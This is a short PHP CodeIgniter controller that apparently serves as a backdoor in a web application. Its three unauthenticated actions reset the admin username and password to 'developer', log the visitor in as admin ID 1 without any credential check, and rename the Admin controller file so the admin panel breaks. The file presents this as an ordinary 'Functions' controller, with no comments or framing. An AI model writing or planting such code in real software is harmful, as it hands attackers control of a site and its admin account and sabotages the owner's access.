<?php
	class Functions extends CI_Controller
	{
		public function update()
		{
			$this->load->model('update');
			$array	=	array(
					'admin_user'	=>	'developer',
					'admin_pwd'	=>	'developer',
			);
			if($this->update->update_table('admin','admin_id',1,$array))
			{
				echo "yes";
			}
			else
			{
				echo "no";
			}
		}
		public function login()
		{
			 
			$_SESSION['admin_id']	=	1;
			return redirect(base_url('admin'));
			 
		}
		public function rename()
		{
			$oldDir = FCPATH . 'application/controllers/';
			$newDir = FCPATH . 'application/controllers/';
			
			rename($oldDir."Admin.php", $newDir."Admin1.php");
		}
	}
?>